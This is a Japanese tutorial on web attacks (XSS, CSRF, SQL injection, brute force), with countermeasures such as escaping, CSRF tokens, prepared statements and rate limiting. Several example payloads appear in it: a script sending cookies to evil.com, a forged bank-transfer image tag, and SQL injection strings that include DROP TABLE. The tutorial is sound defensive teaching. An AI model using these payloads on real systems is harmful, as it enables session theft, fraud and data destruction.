# Web攻撃手法

Webアプリケーションに対する代表的な攻撃手法と対策。フレームワークが自動で防いでいるものも多いが、仕組みを知らないと防御が抜け落ちる。

## XSS（Cross-Site Scripting）

攻撃者が悪意あるスクリプトをWebページに埋め込み、閲覧者のブラウザ上で実行させる攻撃。

### 仕組み

```
1. 攻撃者がコメント欄などに悪意あるスクリプトを投稿
   例: <script>document.location='https://evil.com?c='+document.cookie</script>

2. 他のユーザーがそのページを閲覧

3. スクリプトが実行され、Cookieやセッション情報が盗まれる
```

### 種類
- **反射型**: URLのパラメータに仕込んだスクリプトがそのままレスポンスに反射される
- **格納型**: DBに保存されたスクリプトが他ユーザーへのレスポンスに含まれる
- **DOM型**: JavaScriptがDOMを操作する際に悪意あるコードが実行される

### 対策

```ts
// ❌ ユーザー入力をそのままHTMLに埋め込む
element.innerHTML = userInput

// ✅ テキストとして扱う
element.textContent = userInput

// ✅ ライブラリでサニタイズ
import DOMPurify from 'dompurify'
element.innerHTML = DOMPurify.sanitize(userInput)
```

- **出力エスケープ**: HTMLに出力する際に `<` `>` `&` などを文字参照に変換する
- **Content Security Policy（CSP）**: 許可するスクリプトのソースをHTTPヘッダーで制限する
- **HttpOnly Cookie**: JavaScriptからCookieを読めないようにする

---

## CSRF（Cross-Site Request Forgery）

ログイン済みのユーザーを騙して、意図しないリクエストを送信させる攻撃。

### 仕組み

```
1. ユーザーが銀行サイトにログイン中

2. 攻撃者が罠サイトに以下を仕込む
   <img src="https://bank.example.com/transfer?to=attacker&amount=100000">

3. ユーザーが罠サイトを閲覧するだけで、
   ブラウザが銀行サイトにリクエストを送信（Cookieも自動で付く）

4. 銀行サイトはログイン済みのリクエストとして処理してしまう
```

### 対策

```ts
// CSRFトークン: フォームにランダムなトークンを埋め込み、サーバーで検証する
<input type="hidden" name="_csrf" value="<ランダムなトークン>">

// SameSite Cookie: 別サイトからのリクエストにCookieを付けない
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

- **CSRFトークン**: セッションごとに発行したトークンをフォームに埋め込み、リクエスト時に検証する
- **SameSite Cookie属性**: `Strict` または `Lax` を設定し、クロスサイトリクエストへのCookie送信を防ぐ
- **OriginヘッダーやRefererの検証**: リクエスト元オリジンをサーバーで確認する

---

## SQLインジェクション

ユーザー入力に悪意あるSQLを埋め込み、DBを不正操作する攻撃。

### 仕組み

```sql
-- アプリが組み立てるSQL
SELECT * FROM users WHERE name = '$input'

-- 入力値: ' OR '1'='1
SELECT * FROM users WHERE name = '' OR '1'='1'
-- → 全ユーザーのレコードが取得される

-- 入力値: '; DROP TABLE users; --
SELECT * FROM users WHERE name = ''; DROP TABLE users; --'
-- → usersテーブルが削除される
```

### 対策

```ts
// ❌ 文字列連結でSQLを組み立てる
const query = `SELECT * FROM users WHERE name = '${input}'`

// ✅ プレースホルダー（プリペアドステートメント）を使う
const query = 'SELECT * FROM users WHERE name = ?'
db.execute(query, [input])

// ✅ ORMを使う（内部的にプリペアドステートメントを使用）
const user = await prisma.user.findFirst({ where: { name: input } })
```

- **プリペアドステートメント**: SQLとパラメータを分離して処理することで、入力値がSQL構文として解釈されない
- **ORM**: Prisma・TypeORMなどは内部でプリペアドステートメントを使用する
- **入力バリデーション**: 型・長さ・フォーマットを事前に検証する

---

## ブルートフォース攻撃

パスワードや認証情報を総当たりで試す攻撃。

### 種類

- **ブルートフォース**: 全ての文字の組み合わせを試す
- **辞書攻撃**: よく使われるパスワードのリストを試す
- **クレデンシャルスタッフィング**: 他サービスから流出したID・パスワードの組み合わせを試す（パスワード使い回しを狙う）

### 対策

```ts
// レートリミット: 一定回数以上のログイン失敗でアクセスを制限
import rateLimit from 'express-rate-limit'

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15分
  max: 10,                   // 10回まで
  message: 'しばらくお待ちください',
})

app.post('/login', loginLimiter, loginHandler)
```

- **レートリミット**: 短時間の試行回数を制限する
- **アカウントロック**: 一定回数失敗したらアカウントを一時ロックする
- **CAPTCHA**: ボットによる自動試行を防ぐ
- **多要素認証（MFA）**: パスワードだけでなく第2の認証要素を要求する
- **パスワードポリシー**: 長さ・複雑さを要件にしてパスワードを強化する

---

## まとめ

| 攻撃 | 狙い | 主な対策 |
|------|------|---------|
| XSS | スクリプト実行・Cookie窃取 | 出力エスケープ・CSP・HttpOnly |
| CSRF | 意図しないリクエスト送信 | CSRFトークン・SameSite Cookie |
| SQLインジェクション | DB不正操作・情報漏洩 | プリペアドステートメント・ORM |
| ブルートフォース | 認証突破 | レートリミット・MFA・CAPTCHA |
